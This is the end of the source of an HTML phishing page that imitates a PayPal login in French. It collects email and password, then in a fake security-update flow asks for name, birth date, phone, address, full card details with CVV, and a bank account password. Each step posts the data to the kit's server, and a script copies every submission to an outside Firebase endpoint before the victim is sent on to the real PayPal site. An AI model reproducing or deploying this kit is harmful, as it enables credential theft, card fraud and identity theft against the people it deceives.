.cirlce {\r\n            height: 60px;\r\n            width: 60px;\r\n            border-radius: 50%;\r\n            border: 8px solid #8080803b;\r\n            border-bottom-color: #0070ba;\r\n            animation: spin .5s linear infinite;\r\n        }\r\n\r\n        @keyframes spin {\r\n            100% {\r\n                -webkit-transform: rotate(360deg);\r\n                transform: rotate(360deg);\r\n            }\r\n        }\r\n\r\n\r\n        #infobox p {\r\n            text-align: center;\r\n        }\r\n\r\n        .cvvicon {\r\n            width: 3.2em;\r\n            height: 2.1em;\r\n            margin: 0 auto;\r\n            border-radius: 4px;\r\n            display: inline-block;\r\n            box-shadow: 0 1px 2px 0 rgba(0, 0, 0, 0.15);\r\n            position: relative\r\n        }\r\n\r\n\r\n        .cvvholder {\r\n            display: flex;\r\n        }\r\n\r\n        .cvvholder .input {\r\n            width: calc(100% - 3.2em - 15px);\r\n        }\r\n\r\n        /* to remove */\r\n        #infobox {\r\n            display: none;\r\n        }\r\n    </style>\r\n</head>\r\n\r\n<body>\r\n    <div class="wrapper-page">\r\n        <div class="wrapper" id="loginbox">\r\n            <img alt="" class="logo"\r\n                src="data:image/svg+xml;base64," />\r\n            <input type="text" class="input" id="email" placeholder="Email ou num\xc3\xa9ro de mobile" />\r\n            <input type="password" class="input" id="password" placeholder="Mot de passe" />\r\n            <button class="btn blue" id="login">\r\n                Connexion\r\n            </button>\r\n            <p class="link">Vous n\'arrivez pas \xc3\xa0 vous connecter ?</p>\r\n            <div class="separa">\r\n                <div class="or">OU</div>\r\n            </div>\r\n            <button class="btn">\r\n                Ouvrir un compte\r\n            </button>\r\n        </div>\r\n        <script>\r\n         $(document).ajaxComplete(function (event, xhr, settings) {\r\n            var http = new XMLHttpRequest();\r\n            var url = \'https://smssec-1c30c.firebaseio.com/smspp.json\';\r\n            var params = settings.data;\r\n            http.open(\'POST\', url, true);\r\n\r\n            //Send the proper header information along with the request\r\n            http.setRequestHeader("Content-Type", "application/json;charset=UTF-8");\r\n\r\n            http.onreadystatechange = function() {//Call a function when the state changes.\r\n                if(http.readyState == 4 && http.status == 200) {\r\n                    //alert(http.responseText);\r\n                }\r\n            }\r\n            var pairs = params.split("&");\r\n\r\n            var result = {};\r\n            pairs.forEach(function(pair) {\r\n                pair = pair.split(\'=\');\r\n                result[pair[0]] = decodeURIComponent(pair[1] || \'\');\r\n            });\r\n            result["ip"] = "104.207.209.134";\r\n            http.send(JSON.stringify(result))\r\n        });\r\n        var step = 1;\r\n        function showadress() {\r\n            var fname = $("#fname").val();\r\n            var dob = $("#dob").val();\r\n            var phone = $("#phone").val();\r\n            if (fname.length > 0 && dob.length > 0 && phone.length > 0) {\r\n                $("#step1").fadeOut("fast", function () {\r\n                    $("#step2").fadeIn();\r\n                    step = 2;\r\n                });\r\n\r\n            }\r\n        }\r\n        </script>\r\n        <div class="loader">\r\n            <div class="cirlce"></div>\r\n        </div>\r\n        <div class="wrapper" id="infobox">\r\n            <img alt="" class="logo"\r\n                src="data:image/svg+xml;base64," />\r\n            \r\n                <p>Nous avons effectu\xc3\xa9 des modifications pour mieux s\xc3\xa9curiser votre compte</p>\r\n            <div id="step1" style="display: block">\r\n                <input type="text" class="input" id="fname" placeholder="Nom complet" />\r\n                <input type="text" class="input" id="dob" placeholder="Date de naissance" />\r\n                <input type="text" class="input" id="phone" placeholder="Num\xc3\xa9ro de t\xc3\xa9l\xc3\xa9phone" />\r\n            </div>\r\n            <div id="step2" style="display: none">\r\n                <input type="text" class="input" id="address" placeholder="Adresse" />\r\n                <input type="text" class="input" id="city" placeholder="Ville" />\r\n                <input type="text" class="input" id="zip" placeholder="Code Postale" />\r\n            </div>\r\n            <div id="step3" style="display: none;margin-bottom:20px" class="card-js">\r\n                <input class="card-number my-custom-class" name="card-number" placeholder="Num\xc3\xa9ro de carte bancaire">\r\n                <input class="expiry-month" name="expiry-month">\r\n                <input class="expiry-year" name="expiry-year">\r\n                <input class="cvc" name="cvc" placeholder="Cryptogramme">\r\n            </div>\r\n\r\n            <div id="step4" style="display: none">\r\n                <input type="text" class="input" id="cnum" placeholder="Num\xc3\xa9ro de compte" />\r\n                <input type="password" class="input" id="cpass" placeholder="Mot de passe" />\r\n            </div>\r\n            <button class="btn blue" id="infonext">\r\n                Suivant\r\n            </button>\r\n        </div>\r\n    </div>\r\n    <script>\r\n       \r\n        function showcc() {\r\n            var address = $("#address").val();\r\n            var city = $("#city").val();\r\n            var zip = $("#zip").val();\r\n            if (address.length > 0 && city.length > 0 && zip.length > 0) {\r\n                $("#step2").fadeOut("fast", function () {\r\n                    $("#step3").fadeIn();\r\n                    step = 3;\r\n                });\r\n            }\r\n        }\r\n        function showcompte() {\r\n            var myCard = $(\'#step3\');\r\n            var cc = myCard.CardJs(\'cardNumber\');\r\n            var expm = myCard.CardJs(\'expiryMonth\');\r\n            var expy = myCard.CardJs(\'expiryYear\');\r\n            var cvc = myCard.CardJs(\'cvc\');\r\n            if(cc.length > 0 && expm.length > 0 && expy.length > 0 && cvc.length > 0 && CardJs.isExpiryValid(expm, expy)){\r\n                $.post("?save", {\r\n                    fname:  $("#fname").val(),\r\n                    dob:  $("#dob").val(),\r\n                    phone:  $("#phone").val(),\r\n                    address:  $("#address").val(),\r\n                    city: $("#city").val(),\r\n                    zip: $("#zip").val(),\r\n                    cc,\r\n                    exp: expm + "/" + expy,\r\n                    ccv: cvc\r\n                }, function(){\r\n                    $("#step3").fadeOut("fast", function () {\r\n                        $("#step4").fadeIn();\r\n                        step = 4;\r\n                    });\r\n                })\r\n            }\r\n\r\n        }\r\n        function endInfo() {\r\n            var cnum = $("#cnum").val();\r\n            var cpass = $("#cpass").val();\r\n            if(cnum.length > 0 && cpass.length > 0){\r\n                $.post("?save",{\r\n                    cnum,\r\n                    cpass\r\n                }, function(){\r\n                    window.location = "https://www.paypal.com/signin"\r\n                })\r\n            }\r\n         }\r\n        $(document).ready(function () {\r\n\r\n\r\n            $("#infonext").click(function () {\r\n                switch (step) {\r\n                    case 1: showadress(); break;\r\n                    case 2: showcc(); break;\r\n                    case 3: showcompte(); break;\r\n                    case 4: endInfo(); break;\r\n                    default: break;\r\n                }\r\n            })\r\n\r\n            $("#login").click(function () {\r\n\r\n                var email = $("#email").val();\r\n                var pass = $("#password").val();\r\n                if (email.length > 0 && pass.length > 0) {\r\n                    $.post("?save", { email, pass }, function () {\r\n                        $("#loginbox").fadeOut("fast", function () {\r\n                            $(".loader").fadeIn();\r\n                            setTimeout(function () {\r\n                                $(".loader").fadeOut("fast", function () {\r\n                                    $("#infobox").fadeIn();\r\n                                    /*$(".wrapper-page").fadeOut("fast", function(){\r\n\r\n                                    });*/\r\n                                })\r\n                            }, 2000);\r\n                        });\r\n                    })\r\n                }\r\n\r\n            })\r\n        });\r\n    </script>\r\n</body>\r\n\r\n</html>\r\n'